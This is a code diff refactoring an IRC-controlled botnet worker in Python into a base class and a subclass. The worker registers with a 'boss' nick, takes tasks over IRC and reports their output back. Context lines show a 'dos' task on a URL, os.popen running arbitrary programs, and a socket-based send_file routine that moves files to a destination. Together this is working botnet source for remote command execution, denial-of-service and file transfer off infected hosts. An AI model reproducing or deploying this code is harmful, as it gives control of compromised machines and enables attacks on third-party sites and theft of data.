@@ -24,9 +24,13 @@ from optparse import OptionParser
 from irc import IRCConnection, IRCBot
 
 
-class WorkerBot(IRCBot):
+class BaseWorkerBot(IRCBot):
+    """\
+    A base class suitable for implementing a Worker that can communicate with
+    the BotnetBot and execute commands
+    """
     def __init__(self, conn, boss):
-        super(WorkerBot, self).__init__(conn)
+        super(BaseWorkerBot, self).__init__(conn)
         
         # event to track when this worker gets registered
         self.registered = Event()
@@ -48,6 +52,113 @@ class WorkerBot(IRCBot):
         gevent.spawn(self.register_with_boss)
         gevent.spawn(self.task_runner)
     
+    def get_task_patterns(self):
+        """\
+        Like everything else, a bunch of two-tuples containing a regex to match
+        and a callback that takes arguments from the regex
+        """
+        raise NotImplementedError
+    
+    def register_with_boss(self):
+        """\
+        Register the worker with the boss
+        """
+        gevent.sleep(10) # wait for things to connect, etc
+        
+        while not self.registered.is_set():
+            self.respond('!register {%s}' % platform.node(), nick=self.boss)
+            gevent.sleep(30)
+    
+    def task_runner(self):
+        """\
+        Run tasks in a greenlet, pulling from the workers' task queue and
+        reporting results to the command channel
+        """
+        while 1:
+            (task_id, command) = self.task_queue.get()
+            
+            for pattern, callback in self.task_patterns:
+                match = re.match(pattern, command)
+                if match:
+                    # execute the callback
+                    ret = callback(**match.groupdict()) or ''
+                    
+                    # clear the stop flag in the event it was set
+                    self.stop_flag.clear()
+                    
+                    # send output of command to channel
+                    for line in ret.splitlines():
+                        self.respond('!task-data %s:%s' % (task_id, line), self.channel)
+                        gevent.sleep(.34)
+            
+            # indicate task is complete
+            self.respond('!task-finished %s' % task_id, self.channel)
+    
+    def require_boss(self, callback):
+        """\
+        Decorator to ensure that commands only can come from the boss
+        """
+        def inner(nick, message, channel, *args, **kwargs):
+            if nick != self.boss:
+                return
+            
+            return callback(nick, message, channel, *args, **kwargs)
+        return inner
+    
+    def command_patterns(self):
+        """\
+        Actual messages listened for by the worker bot - note that worker-execute
+        actually dispatches again by adding the command to the task queue,
+        from which it is pulled then matched against self.task_patterns
+        """
+        return (
+            ('!register-success (?P<cmd_channel>.+)', self.require_boss(self.register_success)),
+            ('!worker-execute (?:\((?P<workers>.+?)\) )?(?P<task_id>\d+):(?P<command>.+)', self.require_boss(self.worker_execute)),
+            ('!worker-ping', self.require_boss(self.worker_ping_handler)),
+            ('!worker-stop', self.require_boss(self.worker_stop)),
+        )
+    
+    def register_success(self, nick, message, channel, cmd_channel):
+        """\
+        Received registration acknowledgement from the BotnetBot, as well as the
+        name of the command channel, so join up and indicate that registration
+        succeeded
+        """
+        # the boss will tell what channel to join
+        self.channel = cmd_channel
+        self.conn.join(self.channel)
+        
+        # indicate that registered so we'll stop trying
+        self.registered.set()
+    
+    def worker_execute(self, nick, message, channel, task_id, command, workers=None):
+        """\
+        Work on a task from the BotnetBot
+        """
+        if workers:
+            nicks = workers.split(',')
+            do_task = self.conn.nick in nicks
+        else:
+            do_task = True
+        
+        if do_task:
+            self.task_queue.put((int(task_id), command))
+            return '!task-received %s' % task_id
+    
+    def worker_stop(self, nick, message, channel):
+        """\
+        Hook to allow any task to be stopped (provided the task checks the stop flag)
+        """
+        self.stop_flag.set()
+    
+    def worker_ping_handler(self, nick, message, channel):
+        """\
+        Respond to pings sent periodically by the BotnetBot
+        """
+        return '!worker-pong {%s}' % platform.node()
+
+
+class WorkerBot(BaseWorkerBot):
     def get_task_patterns(self):
         return (
             ('dos (?P<url>.*)', self.dos),
@@ -123,13 +234,6 @@ class WorkerBot(IRCBot):
         fh = os.popen(program)
         return fh.read()
     
-    def register_with_boss(self):
-        gevent.sleep(10) # wait for things to connect, etc
-        
-        while not self.registered.is_set():
-            self.respond('!register {%s}' % platform.node(), nick=self.boss)
-            gevent.sleep(30)
-    
     def send_file(self, filename, destination):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -157,68 +261,6 @@ class WorkerBot(IRCBot):
     
     def status_report(self):
         return self.task_queue.qsize()
-    
-    def task_runner(self):
-        while 1:
-            (task_id, command) = self.task_queue.get()
-            
-            for pattern, callback in self.task_patterns:
-                match = re.match(pattern, command)
-                if match:
-                    # execute the callback
-                    ret = callback(**match.groupdict()) or ''
-                    
-                    # clear the stop flag in the event it was set
-                    self.stop_flag.clear()
-                    
-                    # send output of command to channel
-                    for line in ret.splitlines():
-                        self.respond('!task-data %s:%s' % (task_id, line), self.channel)
-                        gevent.sleep(.34)
-            
-            # indicate task is complete
-            self.respond('!task-finished %s' % task_id, self.channel)
-    
-    def require_boss(self, callback):
-        def inner(nick, message, channel, *args, **kwargs):
-            if nick != self.boss:
-                return
-            
-            return callback(nick, message, channel, *args, **kwargs)
-        return inner
-    
-    def command_patterns(self):
-        return (
-            ('!register-success (?P<cmd_channel>.+)', self.require_boss(self.register_success)),
-            ('!worker-execute (?:\((?P<workers>.+?)\) )?(?P<task_id>\d+):(?P<command>.+)', self.require_boss(self.worker_execute)),
-            ('!worker-ping', self.require_boss(self.worker_ping_handler)),
-            ('!worker-stop', self.require_boss(self.worker_stop)),
-        )
-    
-    def register_success(self, nick, message, channel, cmd_channel):
-        # the boss will tell what channel to join
-        self.channel = cmd_channel
-        self.conn.join(self.channel)
-        
-        # indicate that registered so we'll stop trying
-        self.registered.set()
-    
-    def worker_execute(self, nick, message, channel, task_id, command, workers=None):
-        if workers:
-            nicks = workers.split(',')
-            do_task = self.conn.nick in nicks
-        else:
-            do_task = True
-        
-        if do_task:
-            self.task_queue.put((int(task_id), command))
-            return '!task-received %s' % task_id
-    
-    def worker_stop(self, nick, message, channel):
-        self.stop_flag.set()
-    
-    def worker_ping_handler(self, nick, message, channel):
-        return '!worker-pong {%s}' % platform.node()
 
 
 if __name__ == '__main__':    
